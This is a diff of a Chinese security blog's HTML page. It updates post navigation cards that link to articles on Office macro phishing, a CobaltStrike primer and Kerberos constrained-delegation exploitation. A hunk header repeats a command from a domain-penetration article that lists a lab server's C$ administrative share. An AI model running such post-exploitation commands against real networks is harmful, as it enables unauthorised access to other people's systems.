                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/11/25/yue-shu-wei-pai-li-yong/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/12/05/diao-yu-yu-she-gong-xi-lie-zhi-office-hong/" property="cc:attributionName"
                rel="cc:attributionURL">
                 ske
             </a> 采用
@@ -551,7 +759,7 @@ dir \\Srv-DB-0day.0day.org\C$\</code></pre><p><img src="/img/delegation/78714f9a
         repo: 'SkewwG.github.io',
         owner: 'SkewwG',
         admin: "SkewwG",
-        id: '2020/11/25/yue-shu-wei-pai-li-yong/',
+        id: '2020/12/05/diao-yu-yu-she-gong-xi-lie-zhi-office-hong/',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -834,28 +1042,29 @@ dir \\Srv-DB-0day.0day.org\C$\</code></pre><p><img src="/img/delegation/78714f9a
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-xun-yu/">
+                <a href="/2020/12/05/diao-yu-yu-she-gong-xi-lie-zhi-office-hong/">
                     <div class="card-image">
                         
-                        <img src="/img/fish/7c321a3d-e2c7-492c-9079-621e2fc032c0.png" class="responsive-img" alt="钓鱼与社工系列之寻鱼">
+                        <img src="/img/fish/7c321a3d-e2c7-492c-9079-621e2fc032c0.png" class="responsive-img" alt="钓鱼与社工系列之office宏">
                         
-                        <span class="card-title">钓鱼与社工系列之寻鱼</span>
+                        <span class="card-title">钓鱼与社工系列之office宏</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            钓鱼与社工系列之寻鱼
+                            钓鱼与社工系列之office宏
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-11-26
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-12-05
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -868,11 +1077,12 @@ dir \\Srv-DB-0day.0day.org\C$\</code></pre><p><img src="/img/delegation/78714f9a
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/钓鱼与社工系列之寻鱼/" target="_blank">
-                        <span class="chip bg-color">钓鱼与社工系列之寻鱼</span>
+                    <a href="/tags/钓鱼与社工系列之office宏/" target="_blank">
+                        <span class="chip bg-color">钓鱼与社工系列之office宏</span>
                     </a>
                     
                 </div>
@@ -886,30 +1096,30 @@ dir \\Srv-DB-0day.0day.org\C$\</code></pre><p><img src="/img/delegation/78714f9a
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/11/25/ji-yu-zi-yuan-de-yue-shu-wei-pai-li-yong/">
+                <a href="/2020/11/27/cobalstrike-sao-mang/">
                     <div class="card-image">
                         
-                        <img src="/img/delegation/70ffc507-8f02-4621-8811-a8050fd47030.png" class="responsive-img" alt="基于资源的约束委派利用">
+                        <img src="/img/CobalStrikeLiteracy/0.6533318592180974.png" class="responsive-img" alt="CobalStrike扫盲">
                         
-                        <span class="card-title">基于资源的约束委派利用</span>
+                        <span class="card-title">CobalStrike扫盲</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            基于资源的约束委派利用
+                            CobalStrike扫盲
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-11-25
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-11-27
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/域渗透/" class="post-category" target="_blank">
-                                    域渗透
+                            <a href="/categories/CobalStrike/" class="post-category" target="_blank">
+                                    CobalStrike
                                 </a>
                             
                             
@@ -919,8 +1129,8 @@ dir \\Srv-DB-0day.0day.org\C$\</code></pre><p><img src="/img/delegation/78714f9a
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/基于资源的约束委派利用/" target="_blank">
-                        <span class="chip bg-color">基于资源的约束委派利用</span>
+                    <a href="/tags/CobalStrike扫盲/" target="_blank">
+                        <span class="chip bg-color">CobalStrike扫盲</span>
                     </a>
                     
                 </div>
